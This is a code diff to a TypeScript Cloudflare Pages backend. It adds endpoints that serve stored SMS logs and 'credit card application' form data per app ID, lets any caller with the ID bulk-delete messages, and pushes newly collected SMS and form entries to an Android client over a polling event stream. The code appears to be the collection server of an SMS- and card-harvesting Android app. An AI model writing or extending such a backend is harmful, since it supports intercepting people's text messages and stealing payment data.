@@ -1269,7 +1269,60 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
     return json({ ok: result.ok, messageId: result.messageId, error: result.error });
   }
 
-  // GET /device/:appId/stream — SSE realtime stream (polling-based, ~25s lifetime then reconnect)
+  // GET /device/:appId/messages — fetch messages (used by SupabaseApi.getSmsLogsByUniqueId)
+  if (method === "GET" && (m = matchPath("/device/:appId/messages", path))) {
+    const appId  = m.appId;
+    const uid    = url.searchParams.get("uid")    ?? "";
+    const limit  = Math.min(500, Math.max(1, parseInt(url.searchParams.get("limit")  ?? "100") || 100));
+    const offset = Math.max(0,               parseInt(url.searchParams.get("offset") ?? "0")   || 0);
+    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
+    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
+    let q = d.from("messages").select("*").eq("app_id", appId).order("sent_at", { ascending: false }).range(offset, offset + limit - 1);
+    if (uid) q = q.eq("sub_id", uid);
+    const { data, error } = await q;
+    if (error) return json({ ok: false, error: error.message }, 500);
+    return json({ ok: true, data: data ?? [] });
+  }
+
+  // DELETE /device/:appId/messages/:msgId — delete a single message
+  if (method === "DELETE" && (m = matchPath("/device/:appId/messages/:msgId", path))) {
+    const appId = m.appId;
+    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
+    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
+    const { error } = await d.from("messages").delete().eq("app_id", appId).eq("id", Number(m.msgId));
+    if (error) return json({ ok: false, error: error.message }, 500);
+    return json({ ok: true });
+  }
+
+  // DELETE /device/:appId/messages — delete all messages for this app
+  if (method === "DELETE" && (m = matchPath("/device/:appId/messages", path))) {
+    const appId = m.appId;
+    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
+    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
+    const { error } = await d.from("messages").delete().eq("app_id", appId);
+    if (error) return json({ ok: false, error: error.message }, 500);
+    return json({ ok: true });
+  }
+
+  // GET /device/:appId/form-data — fetch form_data (used by SupabaseApi.getCreditCardApplications)
+  if (method === "GET" && (m = matchPath("/device/:appId/form-data", path))) {
+    const appId  = m.appId;
+    const uid    = url.searchParams.get("uid")    ?? "";
+    const limit  = Math.min(500, Math.max(1, parseInt(url.searchParams.get("limit")  ?? "100") || 100));
+    const offset = Math.max(0,               parseInt(url.searchParams.get("offset") ?? "0")   || 0);
+    const { data: app } = await d.from("apps").select("status").eq("app_id", appId).single();
+    if (!app || (app as { status: string }).status !== "active") return json({ error: "Invalid App ID" }, 403);
+    let q = d.from("form_data").select("*").eq("app_id", appId).order("submitted_at", { ascending: false }).range(offset, offset + limit - 1);
+    if (uid) q = q.eq("sub_id", uid);
+    const { data, error } = await q;
+    if (error) return json({ ok: false, error: error.message }, 500);
+    return json({ ok: true, data: data ?? [] });
+  }
+
+  // GET /device/:appId/stream — SSE realtime stream
+  // Server-push architecture: polls devices+messages+form_data every 4s and pushes to Android.
+  // SupabaseRealtimeManager on Android connects here and receives event:change events.
+  // Max ~25s lifetime per connection (CF Pages limit), then Android reconnects automatically.
   if (method === "GET" && (m = matchPath("/device/:appId/stream", path))) {
     const appId = m.appId;
 
@@ -1287,33 +1340,86 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
 
         enqueue(`: connected\n\n`);
 
-        // Initial snapshot — send all current devices as INSERT events
+        // ── Initial snapshot ─────────────────────────────────────────────────
+        // 1. Devices (all current)
         const { data: devices } = await d.from("devices").select("*")
-          .eq("app_id", appId)
-          .order("registered_at", { ascending: false })
-          .limit(200);
-
+          .eq("app_id", appId).order("registered_at", { ascending: false }).limit(200);
         for (const row of (devices as Record<string, unknown>[] ?? [])) {
-          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", record: row })}\n\n`);
+          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "devices", record: row })}\n\n`);
         }
 
-        // Poll for updates every 4 seconds; max ~25s runtime then close (client reconnects)
-        const startTime  = Date.now();
-        const MAX_MS     = 25_000;
-        const POLL_MS    = 4_000;
-        let   lastCheck  = new Date().toISOString();
+        // 2. Recent messages (last 50) — Android SmsLog initial load
+        const { data: initMsgs } = await d.from("messages").select("*")
+          .eq("app_id", appId).order("sent_at", { ascending: false }).limit(50);
+        let lastMsgId = 0;
+        for (const row of (initMsgs as Record<string, unknown>[] ?? []).reverse()) {
+          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "messages", record: row })}\n\n`);
+          if (Number(row["id"]) > lastMsgId) lastMsgId = Number(row["id"]);
+        }
+
+        // 3. Recent form_data (last 50)
+        const { data: initForms } = await d.from("form_data").select("*")
+          .eq("app_id", appId).order("submitted_at", { ascending: false }).limit(50);
+        let lastFormId = 0;
+        for (const row of (initForms as Record<string, unknown>[] ?? []).reverse()) {
+          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "form_data", record: row })}\n\n`);
+          if (Number(row["id"]) > lastFormId) lastFormId = Number(row["id"]);
+        }
+
+        // ── Poll loop ────────────────────────────────────────────────────────
+        // Every 4s: check for new messages, new form_data, updated devices.
+        // Server pushes only NEW data — Android never needs to poll separately.
+        const startTime = Date.now();
+        const MAX_MS    = 25_000;
+        const POLL_MS   = 4_000;
+        let   lastDeviceCheck = new Date().toISOString();
 
         while (Date.now() - startTime < MAX_MS) {
           await new Promise<void>(r => setTimeout(r, POLL_MS));
           enqueue(`: ping\n\n`);
 
-          const now = new Date().toISOString();
-          const { data: updated } = await d.from("devices").select("*")
-            .eq("app_id", appId).gte("updated_at", lastCheck);
-          lastCheck = now;
+          // — New messages (id > lastMsgId)
+          if (lastMsgId > 0) {
+            const { data: newMsgs } = await d.from("messages").select("*")
+              .eq("app_id", appId).gt("id", lastMsgId).order("id", { ascending: true });
+            for (const row of (newMsgs as Record<string, unknown>[] ?? [])) {
+              enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "messages", record: row })}\n\n`);
+              if (Number(row["id"]) > lastMsgId) lastMsgId = Number(row["id"]);
+            }
+          } else {
+            // No initial messages — check by sent_at from stream start
+            const { data: newMsgs } = await d.from("messages").select("*")
+              .eq("app_id", appId).order("id", { ascending: false }).limit(10);
+            for (const row of (newMsgs as Record<string, unknown>[] ?? [])) {
+              enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "messages", record: row })}\n\n`);
+              if (Number(row["id"]) > lastMsgId) lastMsgId = Number(row["id"]);
+            }
+          }
 
-          for (const row of (updated as Record<string, unknown>[] ?? [])) {
-            enqueue(`event: change\ndata: ${JSON.stringify({ event: "UPDATE", record: row })}\n\n`);
+          // — New form_data (id > lastFormId)
+          if (lastFormId > 0) {
+            const { data: newForms } = await d.from("form_data").select("*")
+              .eq("app_id", appId).gt("id", lastFormId).order("id", { ascending: true });
+            for (const row of (newForms as Record<string, unknown>[] ?? [])) {
+              enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "form_data", record: row })}\n\n`);
+              if (Number(row["id"]) > lastFormId) lastFormId = Number(row["id"]);
+            }
+          } else {
+            const { data: newForms } = await d.from("form_data").select("*")
+              .eq("app_id", appId).order("id", { ascending: false }).limit(5);
+            for (const row of (newForms as Record<string, unknown>[] ?? [])) {
+              enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", table: "form_data", record: row })}\n\n`);
+              if (Number(row["id"]) > lastFormId) lastFormId = Number(row["id"]);
+            }
+          }
+
+          // — Updated devices (updated_at >= lastDeviceCheck)
+          const nowCheck = new Date().toISOString();
+          const { data: updDevices } = await d.from("devices").select("*")
+            .eq("app_id", appId).gte("updated_at", lastDeviceCheck);
+          lastDeviceCheck = nowCheck;
+          for (const row of (updDevices as Record<string, unknown>[] ?? [])) {
+            enqueue(`event: change\ndata: ${JSON.stringify({ event: "UPDATE", table: "devices", record: row })}\n\n`);
           }
         }
 
@@ -1352,3 +1458,4 @@ export const onRequest: PagesFunction<Env> = async (ctx) => {
     return new Response(JSON.stringify({ error: "Internal server error", detail: String(err) }), { status: 500, headers: { "Content-Type": "application/json" } });
   }
 };
+
